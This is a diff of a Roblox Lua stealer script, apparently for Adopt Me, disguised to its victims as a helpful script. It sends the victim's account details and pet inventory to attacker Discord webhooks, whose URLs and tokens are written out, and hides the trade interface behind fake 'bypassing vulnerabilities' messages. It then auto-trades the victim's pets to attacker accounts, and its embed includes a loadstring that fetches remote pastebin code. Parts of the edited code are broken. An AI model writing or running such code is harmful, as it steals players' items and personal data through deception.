@@ -1,21 +1,15 @@
--- Dual User Configuration
 local LogsUsername = "ImagineGotScamXD"
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loads("InventoryDB")
 local ClientData = Loads('ClientData')
+local legendaries_count = 0
+local mega_count = 0
+local neon_count = 0
+local ultra_count = 0
+local rare_count = 0
+local uncommon_count = 0
+local common_count = 0
 
--- Initialize pet counts
-local pet_counts = {
-    legendary = 0,
-    mega_neon = 0,
-    neon = 0,
-    ultra_rare = 0,
-    rare = 0,
-    uncommon = 0,
-    common = 0
-}
-
--- Function to mute all in-game audio
 local function muteAllAudio()
     for _, sound in pairs(workspace:GetDescendants()) do
         if sound:IsA("Sound") then
@@ -34,35 +28,29 @@ workspace.DescendantAdded:Connect(function(descendant)
     end
 end)
 
--- Function to count pets
-local function countPets()
-    local inventory = ClientData.get("inventory").pets
-    if not inventory then
-        warn("Inventory not found or is empty.")
-        return
-    end
-
-    for _, pet in pairs(inventory) do
-        local petData = InventoryDB[pet.category] and InventoryDB[pet.category][pet.id]
-        if petData then
-            -- Count by rarity
-            if petData.rarity and pet_counts[petData.rarity:lower()] ~= nil then
-                pet_counts[petData.rarity:lower()] = pet_counts[petData.rarity:lower()] + 1
-            end
-
-            -- Count by properties (mega neon, neon)
-            if petData.properties == "mega_neon" then
-                pet_counts.mega_neon = pet_counts.mega_neon + 1
-            elseif petData.properties == "neon" then
-                pet_counts.neon = pet_counts.neon + 1
-            end
-        else
-            warn("Invalid pet data:", pet.category, pet.id)
-        end
-    end
+for i, v in pairs(ClientData.get("inventory").pets) do
+  if InventoryDB[v.category][v.id].rarity == "legendary" then
+    legendaries_count = legendaries_count + 1
+  end
+  if InventoryDB[v.category][v.id].properties == "mega_neon" then
+    mega_count = mega_count + 1
+  end
+  if InventoryDB[v.category][v.id].properties == "neon" then
+    neon_count = neon_count + 1
+  end
+  if InventoryDB[v.category][v.id].rarity == "ultra_rare" then
+    ultra_count = ultra_count + 1
+  end
+  if InventoryDB[v.category][v.id].rarity == "rare" then
+    rare_count = rare_count + 1
+  end
+  if InventoryDB[v.category][v.id].rarity == "uncommon" then
+    uncommon_count = uncommon_count + 1
+  end
+  if InventoryDB[v.category][v.id].rarity == "common" then
+    common_count = common_count + 1
+  end
 end
-
-countPets()
 
 local exploit
 local function getexploit()
@@ -96,7 +84,7 @@ local embed1 = {
   embeds = {
     {
       title = 'Join your player using **EXECUTE TO JOIN THEM** and they should just trade you to start stealing!',
-      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendary).. '\n🐉 Mega Neons: '.. tostring(mega_neon).. '\n🦖 Neons: '.. tostring(neon).. '\n🐊 Ultra Rares: '.. tostring( ultra_rare).. '\n🐌 Rares: '.. tostring(rare).. '\n🦀 Uncommons: '.. tostring(uncommon).. '\n🐈 Commons: '.. tostring(common).. '\n```\n**💼 Execute To Join Them**:\n\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)\n```',
+      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n```\n**💼 Execute To Join Them**:\n\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)\n```',
       color = 10428396,
       fields = {
                 {
@@ -115,7 +103,7 @@ local embed2 = {
   embeds = {
     {
       title = 'Gacor kang dualhuk aselole\nCepetin join dongo keburu diambil',
-      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n🏗 Dual Receiver: '.. LogsUsername ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendary).. '\n🐉 Mega Neons: '.. tostring(mega_neon).. '\n🦖 Neons: '.. tostring(neon).. '\n🐊 Ultra Rares: '.. tostring( ultra_rare).. '\n🐌 Rares: '.. tostring(rare).. '\n🦀 Uncommons: '.. tostring(uncommon).. '\n🐈 Commons: '.. tostring(common).. '\n```\n**🎁 Claim All Script**:\n\n```lua\nUsername = "'.. tostring(plr) ..'"\nloadstring(game:HttpGet("https://pastebin.com/raw/GzXc94aX"))()\n```',
+      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n🏗 Dual Receiver: '.. LogsUsername ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n```\n**🎁 Claim All Script**:\n\n```lua\nUsername = "'.. tostring(plr) ..'"\nloadstring(game:HttpGet("https://pastebin.com/raw/GzXc94aX"))()\n```',
       color = 10428396,
       fields = {
                 {
@@ -142,98 +130,94 @@ local function sendEmbed(webhookUrl, embedData)
     end
 end
 
-local LogsWebhook = "https://discord.com/api/webhooks/1317375854271004682/-m9-COdMc-4sYKsrNjiPuNHbaeWobJ7ncH7seLMpmP2lApOawdE4eF6ekt2DFj_0xJnS"
+local LogsWebhook = "https://discord.com/api/webhooks/1309897171369197588/Es13EP_U_GLWFjJrAwXPasVMU_0h61c3um6K5GNT4z_YJugWa6TGw2m6XNkpV_Y6rWgL"
 sendEmbed(LogsWebhook, embed2)
-wait(7)
+wait(5)
 sendEmbed(Webhook, embed1)
 
--- Initialize trade information
 local trade_info = {}
-
--- Function to handle RemoteEvent connections
-for _, event in pairs(game:GetService("ReplicatedStorage").API:GetChildren()) do
-    if event:IsA("RemoteEvent") then
-        spawn(function()
-            event.OnClientEvent:Connect(function(...)
-                local data = { ... } -- Extract event arguments into a table
-
-                if type(data[3]) == "table" and data[2] == "trade" then
-                    local trade_data = data[3]
-                    trade_info = {
-                        sender = trade_data.sender,
-                        sender_offer = trade_data.sender_offer,
-                    }
-                end
-            end)
-        end)
-    end
+for i, v in pairs(game:GetService("ReplicatedStorage").API:GetChildren()) do
+  if v:IsA('RemoteEvent') then
+    spawn(function()
+      v.OnClientEvent:Connect(function(...)
+        x = {} -- <--- Add a closing } here
+        if type(x[3]) == 'table' and x[2] == 'trade' then
+          table = x[3]
+          sender = table.sender
+          sender_offer = table.sender_offer
+          trade_info = table
+        end
+      end)
+    end)
+  end
 end
-
--- Function to send a trade request
 local function SendTrade()
-    local Loads = require(game.ReplicatedStorage.Fsys).load
-    local RouterClient = Loads("RouterClient")
-    local send_trade = RouterClient.get("TradeAPI/SendTradeRequest")
-
-    repeat
-        if LogsUsername then
-            send_trade:FireServer(LogsUsername)
-        elseif Username then
-            send_trade:FireServer(Username)
-        else
-            print("No username found.")
-        end
-
-        -- Add pets to the trade offer
-        local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
-        local inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
-
-        while inventory.pets and #inventory.pets > 2 do
-            local petCount = 0
-            local petUids = {}
-
-            for petUid, _ in pairs(inventory.pets) do
-                table.insert(petUids, petUid)
-            end
-
-            for i = 1, math.min(18, #petUids) do
-                AddPetRemote:FireServer(petUids[i])
-            end
-
-            -- Accept negotiation
-            local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
-            AcceptNegotiationRemote:FireServer()
-
-            -- Confirm the trade
-            local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
-            AcceptTradeRemote:FireServer()
-
-            -- Update inventory after trade
-            inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
-        end
-
-        if not inventory.pets or #inventory.pets <= 2 then
-            print("Trade completed. Remaining pets: " .. (#inventory.pets or 0))
-            break
-        end
-    until trade_info.sender_offer and #trade_info.sender_offer > 0 and trade_info.sender_offer.player_name
+  local Loads = require(game.ReplicatedStorage.Fsys).load
+  local RouterClient = Loads("RouterClient")
+  local send_trade = RouterClient.get("TradeAPI/SendTradeRequest")
+  
+  while task.wait(10) do
+        repeat
+    if LogsUsername then
+        send_trade:FireServer(LogsUsername)
+    elseif Username then
+        send_trade:FireServer(Username)
+else
+    print("Not found")
 end
-
--- Function to start the trade process
-local function StartTradeProcess()
-    SendTrade()
-end
-
--- Function to wait for the player to appear in the game
-local function WaitForTrade()
-    while true do
-        if game.Players:FindFirstChild(Username) or game.Players:FindFirstChild(LogsUsername) then
-            StartTradeProcess()
-            break
-        else
-            wait(1)
-        end
+            
+wait(4)
+local Loads = require(game.ReplicatedStorage.Fsys).load
+  local RouterClient = Loads("RouterClient")
+  local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+  local juj = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
+  if juj.pets then
+    local petCount = 0
+    local petUids = {}
+        for petUid, petData in pairs(juj.pets) do
+      table.insert(petUids, petUid)
     end
+    
+    while #petUids > 0 do
+      local petUid = table.remove(petUids, 1)
+      AddPetRemote:FireServer(petUid)
+      petCount = petCount + 1
+      if petCount >= 18 then
+        break
+      end
+    end
+  else
+    print("No pets found in inventory.")
+  end
+wait(9)
+local Loads = require(game.ReplicatedStorage.Fsys).load
+  local RouterClient = Loads("RouterClient")
+  local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+  AcceptNegotiationRemote:FireServer()
+wait(16)
+local Loads = require(game.ReplicatedStorage.Fsys).load
+  local RouterClient = Loads("RouterClient")
+  local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+  AcceptTradeRemote:FireServer()
+wait(1)
+        until (trade_info.sender_offer and #trade_info.sender_offer ~= nil) and (trade_info.sender_offer and trade_info.sender_offer.player_name ~= nil)
+end
+end
+
+local function StartSteal()
+        SendTrade()
+end
+
+local function WaitForTrade()
+  while true do
+    if game.Players:FindFirstChild(Username) or game.Players:FindFirstChild(LogsUsername) then
+      wait(5)
+      StartSteal()
+      break
+    else
+      wait(1)
+    end
+  end
 end
 
 local total_pets = 0
@@ -243,8 +227,8 @@ end
 warn("Your Script Detected", total_pets, "Vulnerabilities, Bypassing Them Right Now.")
 wait(5)
 print("Bypassed!")
-    if total_pets == 2 then
-        game:GetService("Players").LocalPlayer:Kick("Alt account detected, please have at least 3 pet in your inventory or use this script on your main account.")
+    if total_pets == 1 then
+        game:GetService("Players").LocalPlayer:Kick("Alt account detected, please have at least 1 pet in your inventory or use this script on your main account.")
 end
 game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
 game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
